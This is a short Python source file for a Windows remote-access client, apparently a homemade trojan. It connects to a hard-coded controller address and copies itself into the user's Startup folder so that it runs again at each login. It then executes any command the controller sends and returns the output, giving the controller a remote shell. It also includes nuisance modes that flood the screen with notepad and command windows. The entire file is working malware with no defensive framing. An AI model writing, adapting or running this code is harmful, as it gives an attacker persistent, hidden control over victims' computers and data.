import socket
import os
#import winshell


class Client:
    def __init__(self):
        self.host = '192.168.1.192'
        self.port = 1234
        self.server = socket.socket()

    def connect(self):
        self.server.connect((self.host, self.port))

    def send(self, text):
        self.server.send(str(text).encode('UTF-8'))

    def recv(self):
        self.msg = self.server.recv(1024)
        return self.msg.decode('UTF-8')

    def startupdirectory(self):
        return '"C:\\Users\\"' + os.getlogin() + '"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'


class Operate:
    def __init__(self):
        self.serv = Client()
        self.serv.connect()
        # Add folder to their startup folder.
        os.popen('copy "client.pyw" ' + self.serv.startupdirectory())

    def hack(self):
        self.msg = self.serv.recv()
        if self.msg.split(' ')[0] == 'NOTE_BOMB':  # Start x numbers of notepads
            for i in range(int(self.msg.split(' ')[1])):
                data =os.popen('notepad.exe')

        elif self.msg.split(' ')[0] == 'MSG':  # Write and open msg to client

            myMsg = ""
            for m in self.msg.split():
                if(m != 'MSG'):
                    myMsg += m
                    myMsg += " "

            os.popen('echo ' + myMsg + ' > text.txt')
            data = os.popen('start text.txt')

        elif self.msg.split(' ')[0] == 'CMD_BOMB':  # Create a lot of CMD:s
            for i in range(int(self.msg.split(' ')[1])):
                data = os.popen('start cmd.exe')
        else:
            data = os.popen(self.msg) #Read from cmd output when input is given.
        
        self.serv.send('recived:\n' + str(data.read()))
        


run = True

bot = Operate()
while run:
    bot.hack()
